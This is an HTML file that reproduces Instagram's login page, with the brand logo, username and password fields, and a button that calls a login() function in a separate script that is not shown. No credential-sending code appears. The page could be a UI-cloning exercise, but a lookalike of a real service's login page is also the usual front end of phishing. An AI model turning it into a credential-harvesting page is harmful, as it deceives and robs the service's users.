<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram Login </title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="container">
    <div class="login-box">
      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo">

      <input type="text" id="username" placeholder="Phone number, username, or email" />
      <div class="password-wrapper">
        <input type="password" id="password" placeholder="Password" />
        <span id="togglePassword">👁️</span>
      </div>

      <button onclick="login()">Log In</button>

      <div class="separator">OR</div>

      <div class="fb-login">📘 Log in with Facebook</div>
      <a href="#" class="forgot">Forgot password?</a>
    </div>

    <div class="signup-box">
      Don't have an account? <a href="#">Sign up</a>
    </div>
  </div>

  <script src="script.js"></script>
</body>
</html>
